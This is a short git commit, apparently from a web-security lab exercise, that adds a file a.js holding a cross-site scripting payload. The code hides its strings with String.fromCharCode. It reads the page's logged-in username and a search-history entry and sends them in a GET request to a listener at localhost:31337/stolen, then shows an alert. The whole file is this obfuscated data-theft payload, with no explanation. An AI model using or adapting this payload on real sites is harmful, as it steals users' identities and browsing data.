480d91b6b62bd2e6501bdab4819fb65e99a36deb
Narek Galstyan <ngalstyan4@gmail.com>
2020-02-05 16:12:33 -0500

    All code

---
+++ a.js
@@ -0,0 +1,15 @@
+// <script>
+$(document).ready(function(){ 
+$.get(
+String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 108, 111, 99, 97, 108, 104, 111, 115, 116, 58, 51, 49, 51, 51, 55, 47, 115, 116, 111, 108, 101, 110, 63, 117, 115, 101, 114, 61)
++document.getElementById(
+	String.fromCharCode(108, 111, 103, 103, 101, 100, 45, 105, 110, 45, 117, 115, 101, 114)
+	).innerHTML
++String.fromCharCode(38, 108, 97, 115, 116, 95, 115, 101, 97, 114, 99, 104, 61)
++document.getElementsByClassName(
+	String.fromCharCode(104, 105, 115, 116, 111, 114, 121, 45, 105, 116, 101, 109)
+	)[1].innerHTML, 
+function() {alert(3)}).always(function() {alert(3)})
+})
+// </script>
+
